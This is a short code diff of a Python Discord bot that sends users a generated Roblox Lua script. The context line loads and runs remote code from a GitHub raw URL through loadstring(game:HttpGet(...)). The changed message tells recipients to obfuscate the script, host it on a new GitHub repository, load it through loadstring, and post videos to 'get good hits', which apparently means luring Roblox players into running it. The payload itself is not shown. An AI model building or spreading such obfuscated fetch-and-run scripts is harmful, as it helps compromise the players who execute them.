@@ -37,7 +37,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BO
 
     try:
         dm = await interaction.user.create_dm()
-        await dm.send("✅ Here's your Roblox script (copy/paste version):\n```lua\n" + lua_script + "\n```")
+        await dm.send("✅ Here's your clean script: First, obfuscate the code and upload it to a new GitHub repository. Once saved, copy the raw script link (HTTPS), insert it into a loadstring and you will be done. Make sure to upload vids, ect to get good hits (Good luck ✊🏾) :\n```lua\n" + lua_script + "\n```")
 
         file = discord.File(fp=bytes(lua_script, 'utf-8'), filename="generated_script.lua")
         await dm.send("💾 PC Users: Download the `.lua` file below.", file=file)
